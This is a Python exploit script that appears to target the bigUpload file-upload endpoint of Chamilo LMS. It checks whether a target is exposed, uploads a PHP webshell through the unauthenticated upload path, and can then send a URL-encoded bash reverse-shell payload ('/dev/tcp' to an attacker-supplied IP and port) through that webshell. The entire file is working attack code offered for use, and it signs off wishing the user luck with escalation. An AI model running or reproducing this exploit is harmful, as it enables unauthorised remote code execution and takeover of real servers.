import requests
from time import sleep


def urlencode_all_characters(string):
    return ''.join('%{0:0>2x}'.format(ord(char)) for char in string)

def checkAction(url: str) -> None:
    try:
        response = requests.get(url)
    except:
        print("[-] HTTP server is not active or available, check link and port.\n[-] Full URL: " + url)
        exit(1)

    response = requests.get(f"{url}/main/inc/lib/javascript/bigupload/files/")
    if (response.status_code != 200):
        print(f"[-] Target is not vulnerable, error code: {response.status_code}.")
        print(f"[-] Could not access {url}/main/inc/lib/javascript/bigupload/files/")
        return
    
    print("[+] Target is likely vulnerable, would you like to exit, send a webshell or a reverse shell? [E/w/r]: ", end="")
    option = str(input())
    if (option == "w"):
        webshellAction(url)
    elif (option == "r"):
        revshellAction(url)
    else:
        exit(0)

def webshellAction(url: str, log: bool = True) -> None:
    f = open("webshell.php", "r")
    webshell = f.read()
    
    vuln_endpoint = url + "/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
    webshell_endpoint = url + "/main/inc/lib/javascript/bigupload/files/webshell.php"

    response = requests.post(
        vuln_endpoint,
        files = {
            'bigUploadFile': ("webshell.php", webshell)
        }
    )

    if response.status_code == 200 and response.text == 'The file has successfully been uploaded.':
        if (log):
            print(f"[+] File has been submitted correctly.\n[+] Endpoint: {webshell_endpoint}?cmd=")
        else:
            return
    else:
        print("[-] File has not been submitted correctly, target may not be vulnerable or something went wrong")

def revshellAction(url: str) -> None:
    webshellAction(url, False)

    print("\n[?] Paste here your IP: ", end="")
    local_ip = str(input())
    print("[?] Paste here your port: ", end="")
    local_port = str(input())
    sleep(0.5)
    print(f"\n[+] Make sure you are listening in port {local_port}")
    sleep(0.75)

    payload = f"echo -n \"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1\" > revshell.sh && chmod u+x revshell.sh && bash revshell.sh"
    encoded_payload = urlencode_all_characters(payload)
    webshell_endpoint = url + "/main/inc/lib/javascript/bigupload/files/webshell.php"

    requests.get(webshell_endpoint + f"?cmd={encoded_payload}", timeout=3)
    print("\n\n[+] Check your reverse shell.\n[+] Good luck in your escalation !!")